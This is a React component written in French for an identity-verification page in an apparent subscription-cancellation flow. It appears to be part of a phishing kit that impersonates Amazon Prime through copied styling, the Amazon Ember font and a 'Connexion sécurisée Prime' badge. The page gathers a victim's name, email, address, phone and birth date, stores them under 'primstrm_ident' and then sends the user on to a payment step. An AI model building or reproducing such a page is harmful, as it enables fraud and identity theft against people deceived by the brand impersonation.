import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
function formatBirth(value) {
  const digits = value.replace(/\D/g, '').slice(0, 8)
  if (digits.length <= 2) return digits
  if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`
  return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`
}

export default function VerificationIdentitePage() {
  const navigate = useNavigate()
  const [form, setForm] = useState({
    name: '',
    email: '',
    address: '',
    zip: '',
    city: '',
    phone: '',
    birth: '',
    reason: 'Trop cher',
  })
  const [errors, setErrors] = useState({})

  const update = (field, value) => {
    if (field === 'birth') {
      value = formatBirth(value)
    }
    setForm((f) => ({ ...f, [field]: value }))
    setErrors((e) => ({ ...e, [field]: false }))
  }

  const submit = (e) => {
    e.preventDefault()
    const required = ['name', 'email', 'address', 'zip', 'city', 'phone', 'birth']
    const nextErrors = {}
    let ok = true
    required.forEach((k) => {
      if (!form[k].trim()) {
        nextErrors[k] = 'Ce champ est requis.'
        ok = false
      }
    })

    // 2. Vérifier le format de l'email (seulement s'il n'est pas vide)
    if (form.email.trim() && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
      nextErrors.email = 'Adresse e-mail invalide.'
      ok = false
    }

    // 3. Vérifier le format du code postal (chiffres)
    if (form.zip.trim() && !/^\d{3,6}$/.test(form.zip)) {
      nextErrors.zip = 'Code postal invalide.'
      ok = false
    }

    if (form.name.trim() && form.name.trim().split(/\s+/).length < 2) {
      nextErrors.name = 'Veuillez saisir votre prénom et votre nom.'
      ok = false
    }

    setErrors(nextErrors)
    if (!ok) return

    localStorage.setItem('primstrm_ident', JSON.stringify(form))
    navigate('/paiement/')
  }

  return (
    <>
      <div style={{ background: '#37475A', padding: '10px 20px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff">
            <path d="M12 1 3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4Zm-1 16-4-4 1.4-1.4L11 14.2l5.6-5.6L18 10l-7 7Z" />
          </svg>
          <span style={{ color: '#fff', fontSize: '14px', fontWeight: 700 }}>Vérification de votre identité</span>
        </div>
        <span style={{ background: '#e77600', color: '#fff', fontSize: '10px', fontWeight: 800, padding: '2px 8px', borderRadius: '10px', letterSpacing: '.3px' }}>ÉTAPE 2 / 3</span>
      </div>

      <main style={{ maxWidth: '540px', margin: '0 auto', padding: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', marginBottom: '18px', fontSize: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '5px', color: '#067D62', fontWeight: 500, whiteSpace: 'nowrap' }}>
            <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: '2px solid #067D62', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: 700, background: '#067D62', color: '#fff' }}>✓</div>
            <span>Abonnement</span>
          </div>
          <div style={{ flex: 1, height: '2px', background: '#067D62', margin: '0 4px', minWidth: '18px' }} />
          <div style={{ display: 'flex', alignItems: 'center', gap: '5px', color: '#0F1111', fontWeight: 700, whiteSpace: 'nowrap' }}>
            <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: '2px solid #0F1111', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: 700, background: '#0F1111', color: '#fff' }}>2</div>
            <span>Identité</span>
          </div>
          <div style={{ flex: 1, height: '2px', background: '#D5D9D9', margin: '0 4px', minWidth: '18px' }} />
          <div style={{ display: 'flex', alignItems: 'center', gap: '5px', color: '#767676', fontWeight: 500, whiteSpace: 'nowrap' }}>
            <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: '2px solid #D5D9D9', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: 700, background: '#fff', color: '#767676' }}>3</div>
            <span>Résiliation</span>
          </div>
        </div>

        <form onSubmit={submit} style={{ background: '#fff', border: '1px solid #D5D9D9', borderRadius: '10px', padding: '20px 20px 22px', boxShadow: '0 2px 8px rgba(0,0,0,.06)' }}>
          <p style={{ fontSize: '11px', fontWeight: 700, color: '#565959', textTransform: 'uppercase', letterSpacing: '.6px', margin: '0 0 14px', paddingBottom: '8px', borderBottom: '1px solid #EAEDED' }}>Informations personnelles</p>

          <Field label="Nom complet" id="name" value={form.name} error={errors.name} onChange={(v) => update('name', v)} placeholder="Prénom et nom" />
          <Field label="Adresse e-mail" id="email" type="email" value={form.email} error={errors.email} onChange={(v) => update('email', v)} placeholder="votre@email.com" />
          <Field label="Adresse" id="address" value={form.address} error={errors.address} onChange={(v) => update('address', v)} placeholder="Numéro et nom de rue" />

          <div style={{ display: 'flex', gap: '12px' }}>
            <Field label="Code postal" id="zip" value={form.zip} error={errors.zip} onChange={(v) => update('zip', v)} placeholder="Code Postal" style={{ flex: 1 }} />
            <Field label="Ville" id="city" value={form.city} error={errors.city} onChange={(v) => update('city', v)} placeholder="Ville" style={{ flex: 1 }} />
          </div>

          <Field label="Téléphone" id="phone" type="tel" value={form.phone} error={errors.phone} onChange={(v) => update('phone', v)} placeholder="" />
          <Field label="Date de naissance" id="birth" value={form.birth} error={errors.birth}  onChange={(v) => update('birth', v)} placeholder="JJ/MM/AAAA" />
          <Field type="hidden" label="Raison de l'annulation" id="reason" value={form.reason} />

          <button type="submit" style={{ display: 'block', width: '100%', textAlign: 'center', background: 'linear-gradient(to bottom,#FFD814,#F7CA00)', border: '1px solid #FCD200', borderRadius: '8px', padding: '11px 14px', fontSize: '15px', fontWeight: 700, color: '#0F1111', cursor: 'pointer', boxShadow: '0 2px 5px rgba(213,217,217,.5)', fontFamily: '"Amazon Ember",Arial,sans-serif', marginTop: '4px' }}>
            Continuer
          </button>

          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px', fontSize: '11px', color: '#767676', marginTop: '12px', textAlign: 'center' }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="#067D62"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5Zm-3 8V6a3 3 0 0 1 6 0v3H9Z" /></svg>
            Connexion sécurisée Prime
          </div>
        </form>
      </main>

      </>
  )
}

function Field({
  label,
  id,
  type = 'text',
  value,
  error,
  onChange,
  placeholder,
  style = {},
}) {
  if (type === 'hidden') {
    return <input id={id} name={id} type="hidden" value={value} />
  }

  return (
    <div style={{ marginBottom: '13px', position: 'relative', ...style }}>
      <label htmlFor={id} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: '13px', fontWeight: 700, color: '#0F1111', marginBottom: '5px' }}>{label}</label>
      <input
        id={id}
        name={id}
        type={type}
        value={value}
        onChange={(e) => onChange?.(e.target.value)}
        placeholder={placeholder}
        style={{
          width: '100%',
          boxSizing: 'border-box',
          padding: '9px 12px',
          fontSize: '14px',
          color: '#0F1111',
          background: '#fff',
          border: `1.5px solid ${error ? '#B12704' : '#888c8c'}`,
          borderRadius: '8px',
          boxShadow: 'inset 0 1px 0 rgba(15,17,17,.07)',
          fontFamily: '"Amazon Ember",Arial,sans-serif',
          transition: 'border-color .15s, box-shadow .15s',
          WebkitAppearance: 'none',
        }}
      />
      {error && <div style={{ color: '#B12704', fontSize: '12px', marginTop: '4px' }}>{error}</div>}
    </div>
  )
}
